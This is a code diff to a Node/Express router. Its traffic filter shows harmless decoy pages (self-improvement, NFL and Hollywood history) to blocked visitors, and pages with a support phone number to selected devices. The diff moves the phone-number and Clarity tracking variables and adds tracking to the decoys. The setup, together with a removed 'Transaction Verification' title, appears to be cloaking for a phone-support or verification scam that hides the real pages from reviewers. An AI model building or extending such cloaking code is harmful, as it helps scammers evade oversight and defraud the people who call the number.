@@ -21,15 +21,17 @@ function randomPick(arr) {
 // Main endpoint — applies traffic filter
 router.get('/endpoint', trafficFilter, (req, res) => {
   const result = req.trafficResult;
+  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
+  const clarity = process.env.CLARITY_ID || '1111111';
 
   if (result.blocked) {
     return res.render('dummy', {
-      title: 'How to improve yourself and feel confident'
+      title: 'How to improve yourself and feel confident',
+      clarity
     });
   }
 
-  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
-  const clarity = process.env.CLARITY_ID || '1111111';
+  
 
 
   if (result.contentServed === 'android') {
@@ -42,22 +44,23 @@ router.get('/endpoint', trafficFilter, (req, res) => {
     return res.render(design.view, { title: design.title, phone,clarity });
   }
 
-  return res.render('dummy', { title: 'Transaction Verification' });
+  return res.render('dummy', { title: 'How to improve yourself and feel confident',clarity });
 });
 
 // Extra endpoint 1
 
 router.get('/endpoint1', trafficFilter, (req, res) => {
   const result = req.trafficResult;
+  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
+  const clarity = process.env.CLARITY_ID || '1111111';
 
   if (result.blocked) {
     return res.render('dummy1', {
-      title: 'Complete History of NFL'
+      title: 'Complete History of NFL',
+      clarity
     });
   }
 
-  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
-  const clarity = process.env.CLARITY_ID || '1111111';
 
 
   if (result.contentServed === 'android') {
@@ -70,7 +73,7 @@ router.get('/endpoint1', trafficFilter, (req, res) => {
     return res.render(design.view, { title: design.title, phone,clarity });
   }
 
-  return res.render('dummy1', { title: 'Complete History of NFL' });
+  return res.render('dummy1', { title: 'Complete History of NFL' ,clarity });
 });
 
 
@@ -78,15 +81,18 @@ router.get('/endpoint1', trafficFilter, (req, res) => {
 
 router.get('/endpoint2', trafficFilter, (req, res) => {
   const result = req.trafficResult;
+  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
+  const clarity = process.env.CLARITY_ID || '1111111';
+
 
   if (result.blocked) {
     return res.render('dummy2', {
-      title: 'Complete History of Hollywood'
+      title: 'Complete History of Hollywood',
+      clarity
     });
   }
 
-  const phone = process.env.SUPPORT_NUMBER || '+18000000000';
-  const clarity = process.env.CLARITY_ID || '1111111';
+  
 
 
   if (result.contentServed === 'android') {
@@ -99,7 +105,7 @@ router.get('/endpoint2', trafficFilter, (req, res) => {
     return res.render(design.view, { title: design.title, phone,clarity });
   }
 
-  return res.render('dummy2', { title: 'Complete History of Hollywood' });
+  return res.render('dummy2', { title: 'Complete History of Hollywood',clarity });
 });
 
 // ===== CONVERSION TRACKING API =====
